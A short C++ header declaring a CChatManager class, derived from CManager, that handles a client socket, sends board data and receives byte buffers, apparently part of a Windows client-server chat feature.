
#if !defined(AFX_CHATMANAGER_H__F0442063_CAAE_4BA1_B6CA_1FCB39A996AC__INCLUDED_)
#define AFX_CHATMANAGER_H__F0442063_CAAE_4BA1_B6CA_1FCB39A996AC__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

//#include "../resource.h"
#include "../Manager.h"

class CChatManager : public CManager  
{
public:
	CChatManager(CClientSocket *pClient);
//	virtual ~CChatManager();
	void SendBoradData();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);

private:
	HWND hwnd;
//	static INT_PTR CALLBACK MyDialogProc(HWND hwndDlg,UINT uMsg,WPARAM wParam,LPARAM lParam);
};

#endif // !defined(AFX_CHATMANAGER_H__F0442063_CAAE_4BA1_B6CA_1FCB39A996AC__INCLUDED_)
